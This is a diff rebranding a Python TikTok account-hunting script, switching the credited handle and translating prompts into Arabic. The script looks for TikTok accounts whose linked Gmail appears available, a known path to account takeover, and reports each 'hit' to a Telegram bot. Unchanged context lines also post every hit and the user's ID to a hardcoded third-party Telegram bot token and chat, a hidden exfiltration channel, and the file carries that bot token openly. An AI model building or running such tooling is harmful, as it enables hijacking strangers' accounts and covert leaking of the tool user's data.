@@ -38,7 +38,7 @@ def subc():
 
    id="|".join(uuid)
 
-   ses=requests.get("https://pastebin.com/9xGqcpwk").text
+   ses=requests.get("https://pastebin.com/J69uUcF3").text
 
    if id in ses:
 
@@ -48,7 +48,7 @@ def subc():
 
    	print("كود التفعيل "+id)
 
-   	print('ادات البوره ستوري اشتراكات')
+   	print('ادات المزداوي اشتراكات')
 
    	sys.exit()
 
@@ -56,14 +56,14 @@ subc()
 
    	
 
-print('تم تفعيل كود من البوره ستوري')
+print('تم تفعيل كود من المزداوي')
 ugen = []
 import requests
 req=requests.get('https://raw.githubusercontent.com/fggertt/obot/main/freetool').text
 if 'freetool' in req:
   pass
 else:
-  exit('خلص تفعي كلم @Qredes للاشتراك')
+  exit('خلص تفعي كلم @MoidTan للاشتراك')
 
 
 try:
@@ -150,13 +150,13 @@ MJ4 = '\x1b[38;5;106m'
 #-------------------#
 os.system('clear')
 print(F+'Tik'+Y+'Tok '+E+'To'+B+'ol'+Z)
-print(B+'_'*40)
-print(F+'DV '+Y+'BY '+E+'@Qre'+B+'des'+Z)
-print(B+'_'*40)
-ID=input(AH_T+'࿎ ID : '+F)
-print(B+'_'*40)
-tok=input(AS_T+'࿈ TOKEN : '+F)
-print(B+'_'*40)
+print(B+'x'*40)
+print(F+'DV '+Y+'BY '+E+'@Moid'+B+'Tan'+Z)
+print(B+'x'*40)
+ID=input(AH_T+'࿎ اايدي حسابك '+F)
+print(B+'x'*40)
+tok=input(AS_T+'࿈ توكن بوتك : '+F)
+print(B+'x'*40)
 
 hj=0
 fc=0
@@ -176,14 +176,14 @@ def telegram(email):
 	nn3 = r.split('"region":"')[1].split('"')[0]
 	likes = r.split('"heartCount":')[1].split(',')[0]
 	tlg = f'''
-⌯ Hi Qredes Got Hit
+⌯ اهلا المزداوي ادات صادتلك حساب❤
 ᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓ
 ⌯ Name {namee}
 ⌯ User —> {username}
 ⌯ Email —> {email}
 ⌯ Follower -> {fl} × {fol} <- Following ⌯
 ⌯ likes —> {likes}
- BY : @Qredes
+ BY : @MoidTan
 		'''
 	print(F+tlg)
 	requests.post(f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text={tlg}")
@@ -194,7 +194,7 @@ def telegram(email):
 مستخدم صاد متاح تيك توك 
 ايدي المستخدم {ID}
 عدد متابعينه {fl}
- BY : @Qredes
+ BY :@MoidTan
 		'''
 	requests.post(f"https://api.telegram.org/bot5815577992:AAHBy164Z1NvWLEZpVn7Y-fFPfEucqtX6ng/sendMessage?chat_id=2116409671&text={fdg}")
 def gmail(email):
@@ -227,7 +227,7 @@ def gmail(email):
  {B} ⌯- {Y}Good Gmail : ࿎ {fj} ࿈
  {B}[{Y}⌯ Email : {email}{B}]
 ''')
-	   print(F+'Othman @Qredes '+Z)
+	   print(F+'Othman @MoidTan '+Z)
        
 	   telegram(email)	    
 	else:
@@ -241,7 +241,7 @@ def gmail(email):
  {B} ⌯- {Y}Good Gmail : ࿎ {fj} ࿈
  {B}[{Y}⌯ Email : {email}{B}]
 ''')
-	    print(f"{B} Developer Othman @Qredes [X]")
+	    print(f"{B} Developer Othman @MoidTan [X]")
 
 	 
 	 
@@ -280,7 +280,7 @@ def tiktok(email):
  {B} ⌯- {Y}Good Gmail : ࿎ {fj} ࿈
  {B}[{Y}⌯ Email : {email}{B}]
 ''')
- 	print(f"{B} Developer Othman @Qredes [X]")
+ 	print(f"{B} Developer Othman @MoidTan [X]")
  	gmail(email)
  
  else:
@@ -294,7 +294,7 @@ def tiktok(email):
  {B} ⌯- {Y}Good Gmail : ࿎ {fj} ࿈
  {B}[{Y}⌯ Email : {email}{B}]
 ''')
-   print(F+'DV '+Y+'BY '+E+'@Qre'+B+'des'+Z)
+   print(F+'DV '+Y+'BY '+E+'@Moid'+B+'Tan'+Z)
       
                    
 
